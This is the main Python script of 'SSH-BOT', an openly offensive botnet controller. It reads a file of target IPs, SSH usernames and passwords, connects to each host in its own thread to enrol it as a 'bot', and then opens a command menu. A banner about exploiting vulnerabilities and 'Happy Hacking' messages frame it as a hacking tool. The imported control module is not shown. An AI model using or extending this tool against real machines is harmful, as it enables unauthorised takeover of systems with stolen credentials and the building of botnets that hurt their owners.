'''
  SSH-BOT
  
 * Copyright (C) 2017 Krhertz
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
  Main
  
'''

#!/usr/bin/python3.4

from threading import Thread
from core.admin import *
import argparse
import os

banner = '''	
==================================================================
| ##   ## ######## ##   ##   ###### ########  ######## ########   |
| ##  ##  ##    ## ##   ##       #  ##    ##     ##          #    |
| ## ##   ##    ## ##   ##      ##  ##    ##     ##         #     |
| ## ##   ######   #######        # ######       ##       #       |
| ##  ##  ##   ##  ##   ##        # ##   ##      ##     #         |
| ##   ## ##    ## ##   ##   #####  ##    ##     ##    ########   |
|                                                                 |
|     Exploiting vulnerabilities, creating new ways through...    |
==================================================================
'''
def main():
	parser = argparse.ArgumentParser(usage='usage:\n-F <file_with_crendentials>')
	parser.add_argument ('-F', dest='creds', type=argparse.FileType('r'), help='SSH targets, users and passwords, separeted by a pipe.(eg. 192.168.1.1|sshuser|passwd )')
	args = parser.parse_args()
	if (args.creds == None):
		print (parser.usage)
		exit (0)

	creds = args.creds
	admin = Admin()

	try:

		for line in creds.readlines():
			data = line.strip('\n').split('|')
			target = data[0]
			sshuser = data[1]
			passwd = data[2]
			t = Thread (target = admin.add_bot, args= (target, sshuser, passwd))
			child = t.start()
		os.system ('sleep 3')
		admin.main_menu ()
		print (banner)
		print ('\n\nHappy Hacking.\n')

	except KeyboardInterrupt:

		admin.BotNetDis ()
		print ('\n\n[!] Closed all sessions correctly yet, next time use \'exit\' to exit properly\n[!] Exited with Ctrl + C\nHappy Hacking.\nBy Kr3rtz')
		exit (5)

	except Exception as e:
		admin.BotNetDis ()
		print ('[!] Error -> ' + str(e))
		exit (5)


if __name__  == '__main__':
	
	main ()
